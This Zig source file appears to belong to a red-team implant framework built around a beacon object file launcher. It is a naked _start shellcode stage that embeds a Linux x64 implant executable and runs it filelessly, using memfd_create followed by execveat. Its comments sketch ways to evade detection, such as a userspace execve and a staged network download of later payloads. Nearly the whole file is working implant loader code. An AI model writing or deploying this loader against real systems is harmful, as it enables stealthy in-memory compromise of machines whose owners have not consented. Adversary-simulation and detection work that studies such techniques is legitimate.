const builtin = @import("builtin");
const std = @import("std");
const main = @import("main");
const bof_launcher = @import("bof_launcher_api");

const exe_raw = @embedFile("_embed_generated/implant-executable_lin_x64");

pub export fn _start() linksection(".startup") callconv(.Naked) noreturn {
    asm volatile (switch (builtin.cpu.arch) {
            .x86_64 =>
            \\ xorl %%ebp, %%ebp
            \\ andq $-16, %%rsp
            \\ callq %[entrypoint:P]
            ,
            else => @compileError("Unsupported arch"),
        }
        :
        : [entrypoint] "X" (&entry),
    );
}

fn entry() noreturn {

    //
    // 1. The shellcode embeds the executable that provides bof-launcher and BOF0.
    //    By default it loads it and executes (entirely in-memory) using well known pattern
    //    (memfd_create + execve syscalls).
    //

    //
    // 2. To simulate more sophisticated threats other techniques could be used that do not use
    //    aforementioned syscalls. One solution that comes to mind would be userspace implementation
    //    of execve syscall, as implemented here: https://github.com/anvilsecure/ulexecve
    //

    //
    // 3. As in executable part of the implant (see main.zig), instead of embedding the executable
    //    in the sources, we could fetch it over the network turning the implant to staged one,
    //    in practice creating a payload with multiple stages (the shellcode fetches the executable
    //    and the executable in turn downloads BOF0).
    //

    const fd = std.os.linux.memfd_create("", std.os.linux.MFD.CLOEXEC);
    if (fd != -1) {
        _ = std.os.linux.write(@intCast(fd), exe_raw, exe_raw.len);
        _ = std.os.linux.syscall5(.execveat, fd, @intFromPtr(""), @intFromPtr(""), 0, std.os.linux.AT.EMPTY_PATH);
    }

    unreachable;
}
